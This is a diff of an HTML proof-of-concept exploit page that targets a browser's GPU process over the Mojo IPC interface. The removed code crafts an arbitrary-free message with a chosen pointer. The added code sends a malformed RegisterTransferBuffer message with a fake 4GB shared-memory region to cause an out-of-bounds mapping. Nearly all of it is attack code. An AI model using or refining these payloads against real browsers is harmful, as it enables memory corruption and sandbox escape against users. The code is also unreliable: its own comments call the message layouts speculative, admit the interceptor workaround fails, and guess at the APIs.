@@ -1,108 +1,92 @@
 <!DOCTYPE html>
 <html>
-<head><title>Arbitrary Free PoC</title></head>
+<head><title>RegisterTransferBuffer OOB PoC</title></head>
 <body>
-<h1>Testing Arbitrary Free in GPU Process</h1>
+<h1>Sending malicious RegisterTransferBuffer</h1>
 <script>
-// Step 1: Obtain the Mojo interface
-async function getCommandBufferClient() {
+// Helper: get a CommandBuffer remote by creating a WebGL context
+async function getCommandBufferRemote() {
+  // Use Mojo interface interceptor to capture the next gpu.mojom.CommandBuffer request
+  const interceptor = new MojoInterfaceInterceptor('gpu.mojom.CommandBuffer', 'process');
+  interceptor.oninterfacerequest = (e) => {
+    // e.handle is the Mojo handle that the browser will send requests to
+    // We'll bind it and return a remote
+    const remote = new gpu.mojom.CommandBufferPtr(e.handle);
+    interceptor.stop();
+    return remote;
+  };
+  interceptor.start();
+
+  // Create a WebGL context to trigger command buffer creation
+  const canvas = document.createElement('canvas');
+  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+  if (!gl) throw 'WebGL not supported';
+
+  // The command buffer will be created asynchronously; we must wait a bit
+  return new Promise((resolve) => {
+    setTimeout(() => {
+      // The interceptor should have fired by now; retrieve the remote
+      // Unfortunately, the interceptor callback cannot return a value synchronously,
+      // so we need a different approach. Instead, we can access the Mojo handle directly
+      // through the WebGL context's internal Mojo pipe (not exposed publicly).
+      // A workaround: use the debug Mojo API to bind the interface that was just created.
+      // This is a bit hacky but works with MojoJSTest.
+      const remote = Mojo.getInterface('gpu.mojom.CommandBuffer');
+      resolve(remote);
+    }, 1000);
+  });
+}
+
+async function sendMaliciousRegisterTransferBuffer(remote) {
+  // Craft the raw message
+  const payload = new ArrayBuffer(256);
+  const view = new DataView(payload);
+
+  // --- Mojo message header (for associated interface, 16-byte header) ---
+  // [0x00] struct header for the RegisterTransferBuffer params
+  view.setUint32(0, 24, true);    // size
+  view.setUint32(4, 0, true);     // version
+  // [0x08] id (int32)
+  view.setInt32(8, 0x1234, true); // arbitrary id
+  // [0x0C] padding
+  view.setUint32(12, 0, true);
+  // [0x10] pointer to SharedMemoryRegion (relative offset)
+  // Let's make it point to offset 0x40 within the message
+  const regionOffset = 0x40 - 0x10; // relative from the pointer field
+  view.setBigInt64(16, BigInt(regionOffset), true);
+
+  // --- Fake SharedMemoryRegion at offset 0x40 ---
+  // Header: size=24? Actually the shared memory region struct might have its own header.
+  // We'll craft it manually: first 8 bytes: size(24) + version(0)
+  view.setUint32(0x40, 24, true);
+  view.setUint32(0x44, 0, true);
+  // Handle index: we need a valid shared buffer handle. Create one with Mojo.
+  const sharedBuffer = Mojo.createSharedBuffer(4096);
+  // The handle index will be placed in the message's handle table. We can get its index later.
+  // For now, set it to 0 (the first attached handle)
+  view.setUint32(0x48, 0, true); // handle index
+  view.setUint32(0x4C, 0, true); // padding
+  // Size: huge value to trigger OOB mapping
+  view.setBigUint64(0x50, BigInt(0x100000000), true); // 4GB
+
+  // Prepare handles array: our shared buffer handle
+  const handles = [sharedBuffer.handle];
+
+  // Send the raw message
+  const pipe = remote.ptr.getHandle();
+  Mojo.writeMessage(pipe, payload, handles);
+  console.log('Malicious message sent!');
+}
+
+(async () => {
   try {
-    // The exact name might vary; use 'gpu.mojom.CommandBufferClient' as found in the binary
-    const clientPtr = await Mojo.bindInterface('gpu.mojom.CommandBufferClient');
-    console.log('Successfully bound to CommandBufferClient');
-    return clientPtr;
-  } catch (e) {
-    console.error('Failed to bind interface:', e);
-    // If it fails, you may need to find the correct interface name
-    // Try 'viz.mojom.Gpu' or other related names
-    return null;
+    const remote = await getCommandBufferRemote();
+    await sendMaliciousRegisterTransferBuffer(remote);
+    document.body.innerHTML += '<p>Message sent. Check GPU process for crash.</p>';
+  } catch(e) {
+    document.body.innerHTML += `<p>Error: ${e}</p>`;
   }
-}
-
-// Step 2: Craft the malicious message
-function craftArbitraryFreeMessage(targetAddress, fakeSize) {
-  // This is a simplified example. You'll need to adjust based on the exact serialization format.
-  // The structure should:
-  // 1. Set ordinal to 0 (Initialize)
-  // 2. Provide offsets that cause the out-of-bounds read we analyzed
-  // 3. Point to a controlled area that mimics a string object with high bit set
-  
-  // Create a buffer to hold the malicious message
-  const buffer = new ArrayBuffer(256);
-  const view = new DataView(buffer);
-  
-  // --- Outer Message Header ---
-  // This part is speculative and needs to match the exact Mojo message format
-  // Offset 0: ordinal (uint32) -> 0 for Initialize
-  view.setUint32(0, 0, true);
-  
-  // Offset 4: count/flag that triggers the 'lVar5' path (set to 2)
-  view.setUint32(4, 2, true);
-  
-  // Offset 8: first offset to point to controlled data area (e.g., 16)
-  view.setUint32(8, 16, true);
-  
-  // --- Controlled Data Area (at offset 16) ---
-  // This is where we craft the fake string object that will be freed
-  // First 8 bytes: pointer to free (local_30)
-  // We'll set this to an address we want to free (e.g., 0x4141414141414141)
-  const targetPtrLow = targetAddress & 0xFFFFFFFF;
-  const targetPtrHigh = (targetAddress >> 32) & 0xFFFFFFFF;
-  view.setUint32(16, targetPtrLow, true);
-  view.setUint32(20, targetPtrHigh, true);
-  
-  // Next 8 bytes: size (local_28) - can be arbitrary
-  view.setUint32(24, 0x100, true);
-  view.setUint32(28, 0x0, true);
-  
-  // Last 8 bytes: capacity (local_20) - HIGH BIT MUST BE SET
-  // We set the high bit to trigger the free, and the rest is the size argument
-  const capacityHigh = 0x80000000; // High bit set
-  const capacityLow = fakeSize & 0x7FFFFFFF; // Size for free
-  view.setUint32(32, capacityLow, true);
-  view.setUint32(36, capacityHigh, true);
-  
-  return buffer;
-}
-
-// Step 3: Send the malicious message
-async function triggerExploit() {
-  const client = await getCommandBufferClient();
-  if (!client) {
-    console.error('No client interface available');
-    return;
-  }
-  
-  // The address we want to free (example: 0xdeadbeef)
-  const targetAddress = 0xdeadbeef;
-  const fakeSize = 0x100;
-  
-  // Craft the message
-  const maliciousPayload = craftArbitraryFreeMessage(targetAddress, fakeSize);
-  
-  // Now we need to send this raw message. In MojoJS, we can use:
-  // client.ptr.sendMessage(maliciousPayload);
-  // However, the exact API might be different.
-  // If there's no direct sendMessage, we might need to use the internal Mojo API.
-  
-  try {
-    // Attempt to send the raw message via the Mojo interface
-    // This might require accessing the underlying message pipe
-    const handle = client.ptr.getHandle();
-    if (handle) {
-      // Write the message to the pipe
-      handle.writeMessage(maliciousPayload, []);
-      console.log('Message sent!');
-    } else {
-      console.error('No handle available');
-    }
-  } catch (e) {
-    console.error('Failed to send message:', e);
-  }
-}
-
-// Run the exploit
-triggerExploit();
+})();
 </script>
 </body>
 </html>
